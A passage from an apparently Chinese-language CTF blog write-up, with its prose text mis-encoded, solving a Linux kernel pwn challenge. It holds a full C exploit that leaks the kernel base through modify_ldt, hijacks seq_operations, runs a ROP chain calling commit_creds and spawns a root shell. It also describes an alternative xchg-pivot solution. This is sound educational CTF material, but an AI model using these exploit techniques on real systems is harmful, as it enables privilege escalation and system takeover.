<p>çˆ†ç ´å‡ºæ¥<code>page_offset_base</code>,é‚£å°±å¯ä»¥åˆ©ç”¨<code>read_ldt</code>åœ¨è¿™æ®µåœ°å€ä¸Šè¯»å–å †ä¿¡æ¯ï¼Œå †ä¸­å°±æœ‰kernel_baseåœ°å€ï¼Œç„¶åå°±æ˜¯<code>seq_operations</code>+å†…æ ¸<code>pt_regs</code>æ ˆè¿ç§»æ‰“äº†ã€‚</p>
<h3 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> add_rsp_0x180_pop_3_ret 0xffffffff815141ae</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdi_ret 0xffffffff8108c420</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swapgs_restore_regs_and_return_to_usermode 0xffffffff81c00fb0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> commit_creds 0xffffffff810c9540</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prepare_kernel_cred 0xffffffff810c99d0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_2_ret 0xffffffff810006a6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ret_gadget 0xffffffff810001fc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> ret_addr;</span><br><span class="line"><span class="keyword">size_t</span> pop_2_ret_addr;</span><br><span class="line"><span class="keyword">size_t</span> add_rsp_0x180_pop_3_ret_addr;</span><br><span class="line"><span class="keyword">size_t</span> pop_rdi_ret_addr;</span><br><span class="line"><span class="keyword">size_t</span> swapgs_restore_regs_and_return_to_usermode_addr;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds_addr;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred_addr;</span><br><span class="line"><span class="keyword">int</span> offsets;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_nokaslr_addr=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernel_base=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ko_fd;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has ben saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">chunk_free</span><span class="params">(<span class="keyword">size_t</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> args[<span class="number">3</span>];</span><br><span class="line">    args[<span class="number">0</span>]=idx;</span><br><span class="line">    ioctl(ko_fd,<span class="string">&#x27;0&#x27;</span>,args);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">chunk_edit</span><span class="params">(<span class="keyword">size_t</span> idx,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> args[<span class="number">3</span>];</span><br><span class="line">    args[<span class="number">0</span>]=idx;</span><br><span class="line">    args[<span class="number">1</span>]=<span class="number">8</span>;</span><br><span class="line">    args[<span class="number">2</span>]=buf;</span><br><span class="line">    ioctl(ko_fd,<span class="string">&#x27;P&#x27;</span>,args);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">chunk_add</span><span class="params">(<span class="keyword">size_t</span> size,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> args[<span class="number">3</span>];</span><br><span class="line">    args[<span class="number">0</span>]=size;</span><br><span class="line">    args[<span class="number">1</span>]=buf;</span><br><span class="line">    ioctl(ko_fd,<span class="string">&#x27; &#x27;</span>,args);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">debug</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] debug\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> seq_fd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">u_desc</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv, <span class="keyword">char</span> ** envp)</span></span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    <span class="keyword">char</span> buf1[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">char</span> buf2[<span class="number">0x1000</span>];</span><br><span class="line">    ko_fd=open(<span class="string">&quot;/dev/kernelpwn&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(buf1,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">    chunk_add(<span class="number">0x10</span>,buf1);</span><br><span class="line">    chunk_free(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    u_desc.base_addr=<span class="number">0xff0000</span>;</span><br><span class="line">    u_desc.entry_number=<span class="number">0x1000</span>/<span class="number">8</span>;</span><br><span class="line">    u_desc.limit=<span class="number">0</span>;</span><br><span class="line">    u_desc.seg_32bit=<span class="number">0</span>;</span><br><span class="line">    u_desc.contents=<span class="number">0</span>;</span><br><span class="line">    u_desc.read_exec_only=<span class="number">0</span>;</span><br><span class="line">    u_desc.limit_in_pages=<span class="number">0</span>;</span><br><span class="line">    u_desc.seg_not_present=<span class="number">0</span>;</span><br><span class="line">    u_desc.useable=<span class="number">0</span>;</span><br><span class="line">    u_desc.lm=<span class="number">0</span>;</span><br><span class="line">    syscall(SYS_modify_ldt,<span class="number">1</span>,&amp;u_desc,<span class="keyword">sizeof</span>(u_desc));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> page_offset_base=<span class="number">0xffff888000000000</span>;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)buf1=page_offset_base;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        chunk_edit(<span class="number">0</span>,buf1);</span><br><span class="line">        <span class="keyword">int</span> ret=syscall(SYS_modify_ldt,<span class="number">0</span>,buf1,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            page_offset_base+=<span class="number">0x40000000</span>;</span><br><span class="line">            *(<span class="keyword">size_t</span> *)buf1=page_offset_base;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;page_offset_base_addr:%p\n&quot;</span>,page_offset_base);</span><br><span class="line">    <span class="comment">// size_t addr=page_offset_base;</span></span><br><span class="line">    <span class="comment">// *(size_t *)buf1=addr;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// for(int i=0;i&lt;0x200;i++)&#123;</span></span><br><span class="line">    <span class="comment">//     chunk_edit(0,buf1);</span></span><br><span class="line">    <span class="comment">//     int ret=syscall(SYS_modify_ldt,0,buf2,0x1000);</span></span><br><span class="line">    <span class="comment">//     if(ret&lt;0)&#123;</span></span><br><span class="line">    <span class="comment">//         printf(&quot;write again fail\n&quot;);</span></span><br><span class="line">    <span class="comment">//         continue;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">//     for(int j=0;j&lt;0x1000/8;j++)&#123;</span></span><br><span class="line">    <span class="comment">//         size_t content=*((size_t *)buf2+j);</span></span><br><span class="line">    <span class="comment">//         if((content&amp;0xffffffff00000000)==0xffffffff00000000)&#123;</span></span><br><span class="line">    <span class="comment">//             if((content&amp;0xffffffff)!=0xffffffff)&#123;</span></span><br><span class="line">    <span class="comment">//                 printf(&quot;kernel_addr:%p  content:%p\n&quot;,addr+8*j,*((size_t *)buf2+j));</span></span><br><span class="line">    <span class="comment">//             &#125;</span></span><br><span class="line">                </span><br><span class="line">    <span class="comment">//         &#125;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">//     addr+=0x1000;</span></span><br><span class="line">    <span class="comment">//     *(size_t *)buf1=addr;</span></span><br><span class="line">    <span class="comment">//     memset(buf2,0,0x1000);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="keyword">size_t</span> addr=page_offset_base+<span class="number">0x9d000</span>;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)buf1=addr;</span><br><span class="line">    chunk_edit(<span class="number">0</span>,buf1);</span><br><span class="line">    syscall(SYS_modify_ldt,<span class="number">0</span>,buf2,<span class="number">0x1000</span>);</span><br><span class="line">    kernel_base=*(<span class="keyword">size_t</span> *)buf2<span class="number">-0x40</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] kernel_base:%p\n&quot;</span>,kernel_base);</span><br><span class="line"></span><br><span class="line">    chunk_add(<span class="number">0x20</span>,buf1);</span><br><span class="line">    chunk_free(<span class="number">1</span>);</span><br><span class="line">    seq_fd=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    add_rsp_0x180_pop_3_ret_addr=add_rsp_0x180_pop_3_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    pop_rdi_ret_addr=pop_rdi_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    commit_creds_addr=commit_creds-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    prepare_kernel_cred_addr=prepare_kernel_cred-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode_addr=swapgs_restore_regs_and_return_to_usermode-vmlinux_nokaslr_addr+kernel_base+<span class="number">0xe</span>;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)buf1=add_rsp_0x180_pop_3_ret_addr;</span><br><span class="line">    chunk_edit(<span class="number">1</span>,buf1);</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, pop_rdi_ret_addr;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, 0;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, prepare_kernel_cred_addr;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, commit_creds_addr;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp, swapgs_restore_regs_and_return_to_usermode_addr;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rax, 0;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 0x200;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// read(seq_fd,buf1,0x200);</span></span><br><span class="line">    usr_shell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="å®˜æ–¹è§£æ³•"><a href="#å®˜æ–¹è§£æ³•" class="headerlink" title="å®˜æ–¹è§£æ³•"></a>å®˜æ–¹è§£æ³•</h2><p>ååˆ†å·§å¦™çš„è§£æ³•ï¼Œå­¦åˆ°äº†å¾ˆå¤šã€‚</p>
<p>å®˜æ–¹å‰æœŸçš„åœ°å€çˆ†ç ´å’Œæˆ‘å¤§å·®ä¸å·®ï¼Œä½†åœ¨åé¢å¯¹<code>seq_operations</code>çš„<code>start</code>æŒ‡é’ˆçš„åˆ©ç”¨å¼€å§‹ä¸ä¸€æ ·äº†ï¼Œç”±äºåªå¼€äº†<code>kpti</code>å’Œ<code>smep</code>ï¼Œæ‰€ä»¥åœ¨å†…æ ¸æ€è¿˜æ˜¯å¯ä»¥è®¿é—®ç”¨æˆ·æ€æ•°æ®çš„ï¼Œæ‰€ä»¥å¯ä»¥åœ¨ç”¨æˆ·æ€å¸ƒç½®å†…æ ¸ropç„¶ååœ¨å†…æ ¸æ€ç›´æ¥æŠŠspå¯„å­˜å™¨è¿ç§»åˆ°ç”¨æˆ·æ€ã€‚</p>
<p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/isolation/user-kernel/figure/476px-Kernel_page-table_isolation.svg.png" alt="File:Kernel page-table isolation.svg"></p>
<p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæ€ä¹ˆåˆ©ç”¨ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆè®©rspæŒ‡å‘è‡ªå·±å¸ƒç½®åœ¨å†…æ ¸æ€çš„ropå‘¢ï¼Œå®˜æ–¹è§£æ³•é‡Œç»™å‡ºäº†ä¸€ä¸ªååˆ†å·§å¦™ï¼ˆè‡³å°‘æˆ‘ç¬¬ä¸€æ¬¡è§ï¼‰çš„æ–¹æ³•ï¼Œå°±æ˜¯åˆ©ç”¨ä»¥ä¸‹gadget</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xchg_eax_esp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>xchgå°±æ˜¯äº’æ¢ä¸¤ä¸ªå¯„å­˜å™¨çš„æ•°æ®ï¼Œä¸€èˆ¬å‡½æ•°æŒ‡é’ˆéƒ½æ˜¯å…ˆåŠ è½½åˆ°raxå¯„å­˜å™¨ä¸­ç„¶åå†<code>call rax</code>çš„ï¼Œæ‰€ä»¥æ‰§è¡Œ<code>xchg eax, esp</code>çš„æ—¶å€™raxå°±æŒ‡å‘è¿™ä¸ªgadgetçš„åœ°å€ï¼Œè¿™ä¸ªgadgetçš„åœ°å€æ˜¯å¯æ§çš„ï¼Œä½†æ˜¯å¯æƒœæ˜¯å†…æ ¸åœ°å€ï¼Œä½†æ˜¯æ³¨æ„è¿™ä¸ªgadgetåªæ˜¯äº¤æ¢å¯„å­˜å™¨çš„å32ä½ï¼Œäº¤æ¢å®Œåçš„espå°±è½åˆ°äº†ç”¨æˆ·æ€äº†ï¼Œéšæ„æˆ‘ä»¬åªè¦<code>mmap(xchg_eax_esp &amp; 0xfffff000, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);</code>å°±å¯ä»¥æŠŠrspæŒ‡å‘ç”¨æˆ·æ€äº†ã€‚</p>
<p>å®˜è§£åœ¨å¸ƒç½®ropçš„æ—¶å€™æ²¡æœ‰é‡æ–°è®¾ç½®<code>cr3</code>çš„å€¼ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰æ›´æ¢é¡µè¡¨ï¼Œæ‰€ä»¥æœ€åè¿”å›ç”¨æˆ·æ€ä¹‹åæ‰§è¡ŒæŒ‡ä»¤è‚¯å®šä¼šçˆ†æ®µé”™è¯¯ï¼Œå®˜è§£æ˜¯è¿™æ ·å¤„ç†çš„,ä»–è®¾ç½®äº†æ®µé”™è¯¯çš„å¤„ç†å‡½æ•°ï¼Œè¿™æ ·åœ¨å‘ç”Ÿäº†æ®µé”™è¯¯ä»¥åï¼Œé‡æ–°é™·å…¥å†…æ ¸æ€ï¼Œç„¶åå†…æ ¸æ€è‡ªåŠ¨åˆ‡æ¢åˆ°ç”¨æˆ·æ€ç„¶åæ‰§è¡Œå¤„ç†å‡½æ•°<code>spawn_shell</code>ï¼Œè¿™æ ·å°±å¯ä»¥ä¸ç”¨æˆ‘ä»¬å¸ƒç½®ä½†æ˜¯å®Œç¾çš„è¿”å›åˆ°äº†ç”¨æˆ·æ€å¹¶æ‰§è¡Œç”¨æˆ·æ€æŒ‡ä»¤äº†ã€‚</p>
<p>ä½†æ˜¯ç›´æ¥å¸ƒç½®<code>swapgs_restore_regs_and_return_to_usermode</code>ä½¿ç”¨çš„å†…å­˜å…¶å®å·®ä¸å¤šçš„ï¼Œå˜¿å˜¿ï¼Œå¯ä»¥ç”¨ä½†æ˜¯æ²¡å¿…è¦ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spawn_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">signal(SIGSEGV, spawn_shell);</span><br></pre></td></tr></table></figure>

<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>é€šè¿‡è¿™é“é¢˜ä¹Ÿæ˜¯å­¦åˆ°äº†å¾ˆå¤šï¼Œæ›´åŠ ç†Ÿæ‚‰ç”¨æˆ·æ€é¡µè¡¨å’Œå†…æ ¸æ€é¡µè¡¨çš„éš”ç¦»æœºåˆ¶äº†ï¼Œæ¯”å¦‚å¼€äº†kptiä½†æ˜¯ä¸å¼€smepåœ¨å†…æ ¸æ€æ—¶å…¶å®å’Œå¼€äº†æ²¡æœ‰å·®åˆ«ï¼Œä½†æ˜¯å¼€äº†kptiå¼€ä¸å¼€smapå·®åˆ«è¿˜æ˜¯æŒºå¤§çš„ã€‚</p>
<p>ç„¶åæ˜¯å¯¹<code>swapgs_restore_regs_and_return_to_usermode</code>çš„ç†è§£ï¼Œåœ¨å­¦ä¹ <code>ret2dir</code>çš„æ—¶å€™æˆ‘ä¸ç†è§£ä¸ºä»€ä¹ˆäº¤æ¢äº†é¡µè¡¨ä¹‹åè¿˜æ˜¯å¯ä»¥ç»§ç»­æ‰§è¡Œ<code>swapgs_restore_regs_and_return_to_usermode</code>,é€šè¿‡<code>mit6.s081</code>çš„å­¦ä¹ ï¼Œèƒ½è¿™æ ·åšçš„å”¯ä¸€è§£æ³•å°±æ˜¯è¿™ä¸ªå‡½æ•°åœ¨ç”¨æˆ·æ€å’Œå†…æ ¸æ€éƒ½è¿›è¡Œäº†æ˜ å°„ï¼Œç„¶åæ˜ å°„çš„è™šæ‹Ÿåœ°å€æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ï¼Œä¹Ÿä½è¯äº†ç”¨æˆ·æ€é¡µè¡¨æ˜ å°„äº†å°‘é‡çš„å†…æ ¸æ€åœ°å€ã€‚</p>
<p>è¿™é“é¢˜åœ¨çˆ†ç ´åˆ°å†…æ ¸åœ°å€åå°±æ˜¯æ¯”è¾ƒç®€å•äº†ï¼ŒåŸå› æ˜¯æ²¡æœ‰å¼€<code>pt_regs</code>çš„åç§»å’Œ<code>smap</code>,å‡å¦‚è¿™ä¸¤ä¸ªéƒ½å¼€äº†çš„è¯ï¼Œç›®å‰æˆ‘èƒ½æƒ³åˆ°çš„è§£æ³•å°±æ˜¯åˆ©ç”¨<code>ret2dir</code>è¿›è¡Œropäº†ï¼Œè¿™æ ·ä¼šæ¯”è¾ƒéº»çƒ¦ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="ä¸‹ä¸€é¡µ"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">rootzhang</p>
  <div class="site-description" itemprop="description">æˆ‘çš„åšå®¢</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">45</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">rootzhang</span>
</div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> å¼ºåŠ›é©±åŠ¨
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
